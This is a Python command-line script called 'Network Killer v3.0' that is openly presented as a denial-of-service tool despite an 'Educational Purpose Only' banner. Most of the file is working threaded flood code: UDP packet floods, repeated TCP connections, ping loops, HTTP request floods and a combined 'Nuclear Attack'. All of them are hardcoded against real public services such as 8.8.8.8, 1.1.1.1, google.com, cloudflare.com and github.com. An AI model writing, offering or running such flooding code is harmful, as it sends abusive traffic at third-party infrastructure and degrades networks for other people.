#!/usr/bin/env python3
"""

                                                                    
███╗   ██╗███████╗████████╗██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗
████╗  ██║██╔════╝╚══██╔══╝██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝
██╔██╗ ██║█████╗     ██║   ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ 
██║╚██╗██║██╔══╝     ██║   ██║███╗██║██║   ██║██╔══██╗██╔═██╗ 
██║ ╚████║███████╗   ██║   ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗
╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
"""

import time
import subprocess
import os
import sys
import threading
import socket
import random
import platform

# Colors for terminal
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RESET = '\033[0m'
    BLACK = '\033[90m'

class HackerNetworkSlower:
    def __init__(self):
        self.clear_screen()
        self.print_banner()
        self.running = True
        self.threads = []
        self.packet_count = 0
        self.start_time = time.time()
        self.os_type = platform.system()
        
        # Check admin
        self.is_admin = self.check_admin()
        
        self.print_menu()
    
    def clear_screen(self):
        """Clear terminal screen"""
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def print_banner(self):
        """Print hacker style banner"""
        banner = f"""
{Colors.RED}{Colors.BOLD}
{Colors.RESET}
{Colors.CYAN}{Colors.BOLD}   
    ╔══════════════════════════════════════════════════════════════╗
    ║  ███╗   ██╗███████╗████████╗██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗  ║
    ║  ████╗  ██║██╔════╝╚══██╔══╝██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝  ║
    ║  ██╔██╗ ██║█████╗     ██║   ██║ █╗ ██║██║   ██║██████╔╝█████╔╝   ║
    ║  ██║╚██╗██║██╔══╝     ██║   ██║███╗██║██║   ██║██╔══██╗██╔═██╗   ║
    ║  ██║ ╚████║███████╗   ██║   ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗  ║
    ║  ╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝  ║
    ╚══════════════════════════════════════════════════════════════╝
{Colors.RESET}
{Colors.GREEN}{Colors.BOLD}    ──────────────────────────────────────────────────────────────
    {Colors.YELLOW}[+] {Colors.WHITE}Network Killer v3.0 {Colors.DIM}:: {Colors.RED}Educational Purpose Only
    {Colors.YELLOW}[+] {Colors.WHITE}OS: {Colors.CYAN}{platform.system()} {platform.release()}
    {Colors.YELLOW}[+] {Colors.WHITE}Mode: {Colors.RED}HACKER{Colors.RESET}
{Colors.GREEN}    ──────────────────────────────────────────────────────────────{Colors.RESET}
"""
        print(banner)
    
    def print_menu(self):
        """Print main menu"""
        menu = f"""
{Colors.CYAN}{Colors.BOLD}╔══════════════════════════════════════════════════════════════╗
║ {Colors.YELLOW}💀 {Colors.WHITE}ATTACK OPTIONS {Colors.DIM}:: {Colors.RED}Choose Your Weapon{Colors.CYAN}                ║
╠══════════════════════════════════════════════════════════════╣
║ {Colors.GREEN}[1] {Colors.WHITE}UDP Flood      {Colors.DIM}→ {Colors.RED}🌊 DDoS Attack{Colors.CYAN}                    ║
║ {Colors.GREEN}[2] {Colors.WHITE}TCP Flood      {Colors.DIM}→ {Colors.RED}🔗 Connection Storm{Colors.CYAN}                ║
║ {Colors.GREEN}[3] {Colors.WHITE}ICMP Flood     {Colors.DIM}→ {Colors.RED}📡 Ping of Death{Colors.CYAN}                  ║
║ {Colors.GREEN}[4] {Colors.WHITE}HTTP Flood     {Colors.DIM}→ {Colors.RED}🌐 Web Killer{Colors.CYAN}                     ║
║ {Colors.GREEN}[5] {Colors.WHITE}ALL Combined   {Colors.DIM}→ {Colors.RED}💀 Nuclear Attack{Colors.CYAN}                 ║
║ {Colors.GREEN}[6] {Colors.WHITE}Speed Limiter  {Colors.DIM}→ {Colors.RED}🐢 Slow Down{Colors.CYAN}                      ║
║ {Colors.GREEN}[7] {Colors.WHITE}Stop Attack    {Colors.DIM}→ {Colors.RED}✋ Cease Fire{Colors.CYAN}                     ║
║ {Colors.GREEN}[s] {Colors.WHITE}Status         {Colors.DIM}→ {Colors.RED}📊 Show Stats{Colors.CYAN}                     ║
║ {Colors.GREEN}[q] {Colors.WHITE}Exit           {Colors.DIM}→ {Colors.RED}🚪 Get Out{Colors.CYAN}                       ║
╚══════════════════════════════════════════════════════════════╝{Colors.RESET}
"""
        print(menu)
    
    def check_admin(self):
        """Check if running as admin/root"""
        try:
            if self.os_type == 'Windows':
                import ctypes
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            else:
                return os.geteuid() == 0
        except:
            return False
    
    def get_targets(self):
        """Get targets"""
        return [
            ('8.8.8.8', 53),
            ('1.1.1.1', 53),
            ('208.67.222.222', 53),
        ]
    
    def udp_flood(self):
        """UDP Flood"""
        print(f"\n{Colors.RED}[!] {Colors.YELLOW}UDP FLOOD STARTED!{Colors.RESET}")
        print(f"{Colors.DIM}    Sending UDP packets to multiple targets...{Colors.RESET}")
        
        targets = self.get_targets()
        
        def flood():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            except:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            data = b'X' * 1400
            count = 0
            target_idx = 0
            
            print(f"{Colors.GREEN}[+] {Colors.WHITE}Sending UDP packets...{Colors.RESET}")
            
            while self.running:
                try:
                    target = targets[target_idx % len(targets)]
                    sock.sendto(data, target)
                    count += 1
                    target_idx += 1
                    self.packet_count += 1
                    
                    if count % 100 == 0:
                        print(f"{Colors.CYAN}[→] {Colors.WHITE}Sent {count} UDP packets...{Colors.RESET}", end='\r')
                    
                    for _ in range(5):
                        if not self.running:
                            break
                        sock.sendto(data, target)
                        count += 1
                        self.packet_count += 1
                    
                    time.sleep(0.001)
                except:
                    pass
            
            sock.close()
            print(f"\n{Colors.GREEN}[✓] {Colors.WHITE}UDP Flood stopped. Total: {count} packets{Colors.RESET}")
        
        thread = threading.Thread(target=flood, daemon=True)
        thread.start()
        self.threads.append(thread)
        print(f"{Colors.GREEN}[✓] {Colors.WHITE}UDP Flood running!{Colors.RESET}")
    
    def tcp_flood(self):
        """TCP Flood"""
        print(f"\n{Colors.RED}[!] {Colors.YELLOW}TCP FLOOD STARTED!{Colors.RESET}")
        print(f"{Colors.DIM}    Opening multiple TCP connections...{Colors.RESET}")
        
        targets = [
            ('8.8.8.8', 80),
            ('1.1.1.1', 80),
            ('google.com', 80),
        ]
        
        def flood():
            count = 0
            sockets = []
            
            print(f"{Colors.GREEN}[+] {Colors.WHITE}Opening TCP connections...{Colors.RESET}")
            
            while self.running:
                try:
                    for target in targets:
                        if not self.running:
                            break
                        try:
                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            sock.settimeout(0.1)
                            sock.connect(target)
                            sockets.append(sock)
                            count += 1
                            self.packet_count += 1
                            
                            if count % 10 == 0:
                                print(f"{Colors.CYAN}[→] {Colors.WHITE}{count} TCP connections open...{Colors.RESET}", end='\r')
                        except:
                            pass
                        
                        if len(sockets) > 300:
                            for _ in range(30):
                                try:
                                    if sockets:
                                        sockets.pop().close()
                                except:
                                    pass
                    
                    time.sleep(0.01)
                except:
                    pass
            
            for sock in sockets:
                try:
                    sock.close()
                except:
                    pass
            
            print(f"\n{Colors.GREEN}[✓] {Colors.WHITE}TCP Flood stopped. Total: {count} connections{Colors.RESET}")
        
        thread = threading.Thread(target=flood, daemon=True)
        thread.start()
        self.threads.append(thread)
        print(f"{Colors.GREEN}[✓] {Colors.WHITE}TCP Flood running!{Colors.RESET}")
    
    def icmp_flood(self):
        """ICMP Flood"""
        print(f"\n{Colors.RED}[!] {Colors.YELLOW}ICMP FLOOD STARTED!{Colors.RESET}")
        print(f"{Colors.DIM}    Sending ping packets...{Colors.RESET}")
        
        def flood():
            count = 0
            targets = ['8.8.8.8', '1.1.1.1']
            
            print(f"{Colors.GREEN}[+] {Colors.WHITE}Sending ping packets...{Colors.RESET}")
            
            while self.running:
                try:
                    for target in targets:
                        if not self.running:
                            break
                        
                        if self.os_type == 'Windows':
                            cmd = f'ping -n 1 -w 100 {target} >nul 2>&1'
                        else:
                            cmd = f'ping -c 1 -W 1 {target} >/dev/null 2>&1'
                        
                        subprocess.run(cmd, shell=True, capture_output=True)
                        count += 1
                        self.packet_count += 1
                        
                        if count % 50 == 0:
                            print(f"{Colors.CYAN}[→] {Colors.WHITE}{count} pings sent...{Colors.RESET}", end='\r')
                    
                    time.sleep(0.001)
                except:
                    pass
            
            print(f"\n{Colors.GREEN}[✓] {Colors.WHITE}ICMP Flood stopped. Total: {count} pings{Colors.RESET}")
        
        thread = threading.Thread(target=flood, daemon=True)
        thread.start()
        self.threads.append(thread)
        print(f"{Colors.GREEN}[✓] {Colors.WHITE}ICMP Flood running!{Colors.RESET}")
    
    def http_flood(self):
        """HTTP Flood"""
        print(f"\n{Colors.RED}[!] {Colors.YELLOW}HTTP FLOOD STARTED!{Colors.RESET}")
        print(f"{Colors.DIM}    Sending HTTP requests...{Colors.RESET}")
        
        def flood():
            count = 0
            urls = ['http://google.com', 'http://cloudflare.com', 'http://github.com']
            
            print(f"{Colors.GREEN}[+] {Colors.WHITE}Sending HTTP requests...{Colors.RESET}")
            
            while self.running:
                try:
                    for url in urls:
                        if not self.running:
                            break
                        try:
                            import urllib.request
                            req = urllib.request.Request(url)
                            req.add_header('User-Agent', 'Mozilla/5.0')
                            urllib.request.urlopen(req, timeout=0.1)
                            count += 1
                            self.packet_count += 1
                            
                            if count % 10 == 0:
                                print(f"{Colors.CYAN}[→] {Colors.WHITE}{count} HTTP requests...{Colors.RESET}", end='\r')
                        except:
                            pass
                    
                    time.sleep(0.001)
                except:
                    pass
            
            print(f"\n{Colors.GREEN}[✓] {Colors.WHITE}HTTP Flood stopped. Total: {count} requests{Colors.RESET}")
        
        thread = threading.Thread(target=flood, daemon=True)
        thread.start()
        self.threads.append(thread)
        print(f"{Colors.GREEN}[✓] {Colors.WHITE}HTTP Flood running!{Colors.RESET}")
    
    def speed_limiter(self):
        """Speed Limiter"""
        print(f"\n{Colors.RED}[!] {Colors.YELLOW}SPEED LIMITER{Colors.RESET}")
        print(f"{Colors.DIM}    Set exact speed limit in KB/s{Colors.RESET}")
        
        try:
            speed = input(f"{Colors.CYAN}[?] {Colors.WHITE}Enter speed in KB/s (e.g., 10, 50, 100): {Colors.RESET}").strip()
            speed_kbps = int(speed)
            if speed_kbps <= 0:
                print(f"{Colors.RED}[✗] {Colors.WHITE}Speed must be > 0{Colors.RESET}")
                return
        except:
            print(f"{Colors.RED}[✗] {Colors.WHITE}Invalid input!{Colors.RESET}")
            return
        
        print(f"\n{Colors.YELLOW}[!] {Colors.WHITE}Limiting speed to {speed_kbps} KB/s...{Colors.RESET}")
        
        def limit_speed():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            targets = self.get_targets()
            
            bytes_per_sec = speed_kbps * 1024
            packet_size = 1400
            packets_per_sec = max(1, int(bytes_per_sec / packet_size))
            delay = 1.0 / packets_per_sec
            
            data = b'X' * packet_size
            count = 0
            total = 0
            target_idx = 0
            start = time.time()
            
            print(f"{Colors.GREEN}[+] {Colors.WHITE}Sending {packets_per_sec} packets/sec{Colors.RESET}")
            
            while self.running:
                try:
                    target = targets[target_idx % len(targets)]
                    sock.sendto(data, target)
                    count += 1
                    total += len(data)
                    target_idx += 1
                    self.packet_count += 1
                    
                    if count % 100 == 0:
                        elapsed = time.time() - start
                        actual_speed = (total / elapsed) if elapsed > 0 else 0
                        print(f"{Colors.CYAN}[→] {Colors.WHITE}Speed: {actual_speed/1024:.1f} KB/s | Target: {speed_kbps} KB/s{Colors.RESET}", end='\r')
                    
                    time.sleep(delay)
                except:
                    pass
            
            sock.close()
            print(f"\n{Colors.GREEN}[✓] {Colors.WHITE}Speed limiter stopped. Total: {total/1024:.1f} KB{Colors.RESET}")
        
        thread = threading.Thread(target=limit_speed, daemon=True)
        thread.start()
        self.threads.append(thread)
        print(f"{Colors.GREEN}[✓] {Colors.WHITE}Speed limiter set to {speed_kbps} KB/s{Colors.RESET}")
    
    def all_combined(self):
        """Nuclear Attack"""
        print(f"\n{Colors.RED}{Colors.BOLD}")
        print("    ╔═══════════════════════════════════════════════╗")
        print("    ║  ☢️  NUCLEAR ATTACK INITIATED!  ☢️           ║")
        print("    ║  UDP + TCP + ICMP + HTTP                    ║")
        print("    ║  This will heavily slow down network        ║")
        print("    ╚═══════════════════════════════════════════════╝")
        print(f"{Colors.RESET}\n")
        
        self.udp_flood()
        time.sleep(1)
        self.tcp_flood()
        time.sleep(1)
        self.icmp_flood()
        time.sleep(1)
        self.http_flood()
        
        print(f"\n{Colors.GREEN}[✓] {Colors.WHITE}All floods running!{Colors.RESET}")
        print(f"{Colors.RED}[!] {Colors.YELLOW}Network should be very slow now!{Colors.RESET}")
    
    def show_status(self):
        """Show status"""
        uptime = int(time.time() - self.start_time)
        print(f"\n{Colors.CYAN}╔══════════════════════════════════════════════════════════════╗")
        print(f"║ {Colors.YELLOW}📊 {Colors.WHITE}ATTACK STATUS{Colors.CYAN}                                                ║")
        print(f"╠══════════════════════════════════════════════════════════════╣")
        print(f"║ {Colors.WHITE}• {Colors.GREEN}Status:{Colors.WHITE} {'🟢 RUNNING' if self.running else '🔴 STOPPED'}{Colors.CYAN}                          ║")
        print(f"║ {Colors.WHITE}• {Colors.GREEN}Packets:{Colors.WHITE} {self.packet_count:,}{Colors.CYAN}                                      ║")
        print(f"║ {Colors.WHITE}• {Colors.GREEN}Threads:{Colors.WHITE} {len(self.threads)}{Colors.CYAN}                                        ║")
        print(f"║ {Colors.WHITE}• {Colors.GREEN}Uptime:{Colors.WHITE} {uptime} seconds{Colors.CYAN}                                     ║")
        print(f"║ {Colors.WHITE}• {Colors.GREEN}OS:{Colors.WHITE} {self.os_type}{Colors.CYAN}                                           ║")
        print(f"╚══════════════════════════════════════════════════════════════╝{Colors.RESET}")
    
    def stop_all(self):
        """Stop all attacks"""
        print(f"\n{Colors.YELLOW}[!] {Colors.WHITE}CEASING FIRE...{Colors.RESET}")
        self.running = False
        
        time.sleep(2)
        self.running = True
        
        for thread in self.threads:
            try:
                thread.join(timeout=1)
            except:
                pass
        
        self.threads = []
        self.packet_count = 0
        print(f"{Colors.GREEN}[✓] {Colors.WHITE}All attacks stopped!{Colors.RESET}")
        print(f"{Colors.GREEN}[✓] {Colors.WHITE}Network should be back to normal{Colors.RESET}")
    
    def run(self):
        """Main loop"""
        while True:
            try:
                choice = input(f"\n{Colors.RED}┌─[{Colors.CYAN}root{Colors.RED}@{Colors.GREEN}network-killer{Colors.RED}]-[{Colors.PURPLE}~{Colors.RED}]\n└──╼ {Colors.WHITE}$ {Colors.RESET}").strip().lower()
                
                if choice == '1':
                    self.udp_flood()
                elif choice == '2':
                    self.tcp_flood()
                elif choice == '3':
                    self.icmp_flood()
                elif choice == '4':
                    self.http_flood()
                elif choice == '5':
                    self.all_combined()
                elif choice == '6':
                    self.speed_limiter()
                elif choice == '7':
                    self.stop_all()
                elif choice == 's':
                    self.show_status()
                elif choice == 'q':
                    self.stop_all()
                    print(f"\n{Colors.RED}[!] {Colors.WHITE}Exiting...{Colors.RESET}")
                    print(f"{Colors.GREEN}[✓] {Colors.WHITE}Goodbye!{Colors.RESET}")
                    break
                else:
                    print(f"{Colors.RED}[✗] {Colors.WHITE}Invalid choice!{Colors.RESET}")
                    print(f"{Colors.DIM}    Options: 1, 2, 3, 4, 5, 6, 7, s, q{Colors.RESET}")
            except KeyboardInterrupt:
                self.stop_all()
                print(f"\n{Colors.RED}[!] {Colors.WHITE}Exiting...{Colors.RESET}")
                break

# ============================================
# MAIN
# ============================================

def main():
    try:
        tool = HackerNetworkSlower()
        tool.run()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.RED}[!] {Colors.WHITE}Interrupted by user{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}[✗] {Colors.WHITE}Error: {e}{Colors.RESET}")

if __name__ == "__main__":
    main()
